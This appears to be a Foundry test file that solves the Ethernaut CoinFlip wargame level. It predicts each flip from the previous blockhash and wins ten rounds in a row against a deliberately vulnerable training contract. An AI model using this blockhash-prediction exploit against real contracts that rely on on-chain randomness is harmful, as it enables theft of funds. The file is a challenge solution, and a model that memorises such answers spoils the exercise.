// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../src/CoinFlip/CoinFlip.sol";
import "../src/CoinFlip/CoinFlipFactory.sol";
import "../src/Ethernaut.sol";

contract CoinFlipTest is Test {
    Ethernaut private _ethernaut;
    CoinFlip private _coinFlip;
    CoinFlipFactory private _coinFlipFactory;

    address private _hacker = address(0xA);

    modifier testWrapper() {
        _ethernaut.registerLevel(_coinFlipFactory);
        vm.startPrank(_hacker);
        address instance = _ethernaut.createLevelInstance(_coinFlipFactory);
        _coinFlip = CoinFlip(instance);
        _;
        bool success = _ethernaut.submitLevelInstance(
            payable(address(_coinFlip))
        );
        vm.stopPrank();
        assertTrue(success);
    }

    function setUp() public {
        _ethernaut = new Ethernaut();
        _coinFlipFactory = new CoinFlipFactory();
    }

    function testCoinFlipHack() public testWrapper {
        bool guess;
        uint256 coinFlip;
        uint256 blockValue;

        for (uint256 i = 0; i < 10; ++i) {
            blockValue = uint256(blockhash(block.number - 1));
            coinFlip =
                blockValue /
                57896044618658097711785492504343953926634992332820282019728792003956564819968;
            guess = coinFlip == 1 ? true : false;
            _coinFlip.flip(guess);
            vm.roll(block.number + 1);
        }
    }
}
